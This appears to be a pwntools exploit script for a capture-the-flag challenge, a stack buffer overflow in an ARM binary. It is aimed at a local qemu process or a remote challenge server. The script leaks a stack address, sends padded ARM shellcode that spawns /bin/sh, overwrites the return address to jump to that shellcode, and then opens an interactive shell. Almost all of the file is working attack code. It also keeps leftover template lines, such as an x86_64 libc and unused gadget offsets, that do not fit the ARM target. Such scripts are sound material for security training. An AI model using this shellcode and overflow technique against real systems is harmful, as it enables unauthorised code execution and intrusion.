#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='root_me_stack_buffer_overflow_basic'
while True :
	# try :
		elf=ELF(elfelf)
		context.arch=elf.arch

		if len(sys.argv)==1 :
			# io=process(elfelf)
			io=process(['qemu-arm','-L','/home/keer/arm','-g','1234','root_me_stack_buffer_overflow_basic'])
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]

		else :
			io=remote('node3.buuoj.cn',29235)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]

		pay="\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
		io.recv()
		io.sendline('a')
		io.recvuntil('0x')
		stack_addr=int(io.recv(8),16)
		io.recv()
		io.sendline('y')
		io.recv()
		pay=pay.ljust(0xa4,'\x00')+p32(stack_addr)
		io.sendline(pay)
		io.recv()
		io.sendline('n')
		io.recv()

		

		
		
		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		
		# success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue